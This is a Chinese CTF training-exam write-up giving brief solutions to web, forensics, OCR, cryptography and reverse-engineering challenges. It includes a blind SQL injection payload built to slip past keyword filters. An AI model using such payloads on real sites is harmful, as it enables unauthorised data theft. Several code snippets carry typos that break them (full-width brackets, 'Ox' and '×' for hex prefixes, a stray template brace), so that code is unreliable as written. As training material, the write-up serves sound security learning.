---
title: 网络安全攻防培训第一期周五考试
draft: false
tags:
  - 安全
  - CTF
  - 考试
date: 2024-04-26
---

1. 签到题 web
   1. 目录扫描，发现网站源码
2. web 题
   1. SQL 注入的绕过和盲注，payload：`?id=1'anandd/**/if(ascii(substr((selselectect(flflagag)from(m1w63729alq1embcbd)),(position},1)) like/**/{mid},1,0)%23"`
3. 杂项，文件
   1. `hex edit`，修复头部`504b` 为`zip`，解压获得`2.png`，修改 `jpg` 高度
4. 数表求乘积

   1. Python 脚本

   ```python
   import pytesseract
   from PIL import Image, ImageEnhance, ImageFilter

   # Open the image
   img = Image.open("/Users/chi/Desktop/file-easysum/file.jpg")

   # Enhance the image contrast
   enhancer = ImageEnhance.Contrast(img)
   img_enhanced = enhancer.enhance(1.5)  # adjust the contrast level

   # Resize and apply a threshold filter for binarization
   img_resized = img_enhanced.resize((1024, 768))
   img_binarized = img_resized.convert("L").point(lambda x: 0 if x < 128 else 255, "1")

   # Configure Tesseract to treat the image as a single uniform block of text
   custom_config = r"--oem 3 --psm 6"
   text = pytesseract.image_to_string(img_binarized, config=custom_config)

   text = text.replace("°", " ")
   # print(text)


   # 处理字符串，转换为二维数组
   def convert_text_to_matrix(text):
       # 按行分割文本
       lines = text.strip().split("\n")

       # 创建二维数组
       matrix = []
       for line in lines:
           # 过滤掉非数字字符，然后按空白字符分割每行
           numbers = line.strip().split()
           # 将分割后的字符串转换为整数列表
           number_list = [int(num) for num in numbers if num.isdigit()]
           # 将列表添加到最终的数组中
           if number_list:
               matrix.append(number_list)

       return matrix


   # 转换文本到二维数组
   matrix = convert_text_to_matrix(text)
   # print(matrix)


   # 打印二维数组
   # print("Converted Matrix:")
   # for row in matrix:
   #     print(row)


   def max_product(matrix):
       n = len(matrix)
       max_prod = 0
       max_numbers = []

       # 检查行和列
       for i in range(n):
           for j in range(n - 4):
               # 行的乘积
               row_prod = (
                   matrix[i][j]
                   * matrix[i][j + 1]
                   * matrix[i][j + 2]
                   * matrix[i][j + 3]
                   * matrix[i][j + 4]
               )
               if row_prod > max_prod:
                   max_prod = row_prod
                   max_numbers = matrix[i][j : j + 5]

               # 列的乘积
               col_prod = (
                   matrix[j][i]
                   * matrix[j + 1][i]
                   * matrix[j + 2][i]
                   * matrix[j + 3][i]
                   * matrix[j + 4][i]
               )
               if col_prod > max_prod:
                   max_prod = col_prod
                   max_numbers = [matrix[j + k][i] for k in range(5)]

       # 检查对角线
       for i in range(n - 4):
           for j in range(n - 4):
               # 主对角线
               diag1_prod = (
                   matrix[i][j]
                   * matrix[i + 1][j + 1]
                   * matrix[i + 2][j + 2]
                   * matrix[i + 3][j + 3]
                   * matrix[i + 4][j + 4]
               )
               if diag1_prod > max_prod:
                   max_prod = diag1_prod
                   max_numbers = [matrix[i + k][j + k] for k in range(5)]

               # 反对角线
               diag2_prod = (
                   matrix[i][j + 4]
                   * matrix[i + 1][j + 3]
                   * matrix[i + 2][j + 2]
                   * matrix[i + 3][j + 1]
                   * matrix[i + 4][j]
               )
               if diag2_prod > max_prod:
                   max_prod = diag2_prod
                   max_numbers = [matrix[i + k][j + 4 - k] for k in range(5)]

       # 生成密码串
       max_numbers.sort()
       password = "".join(map(str, max_numbers))
       return max_prod, password


   # 假设 matrix 已经是一个定义好的 15x15 的二维数组


   max_prod, password = max_product(matrix)
   print("最大乘积：", max_prod)
   print("密码串：", password)
   ```

5. 密码学，凯撒密码

   ```plaintext
   来抓我呀~我一步就是 2 米远，你抓不着我~
   gofn\x84`AZ\x7f\x82\x8cZz\x80\x90\x80\x93g\x8a¤
   ```

   ```python
    key = "gofn\×84`AZ\x7f\x82\×8cZz\x80\x90\x80\x93g|x8a¤"
    flag="'"
    shift = 1

    for i in range (0,len (key)):
        flag = flag + chr(ord(key［i］)-shift)
        shift= shift+2

    print（flag）
   ```

6. 逆向题

   1. `main` 函数

   ```python
   key =［ 0x98,0x9E,0x93,0x99,0xAD,0x7B,0xA0,0xA0,0x97,0xA4,0x7E,0xA1,0xA0,0x99,0xA1,0x9E,Ox9B,0x93,0x91,0x84,0×77,OxAF］
   flag = ""

   for j in key:
       flag += chr(j-50）

   print(flag)
   ```
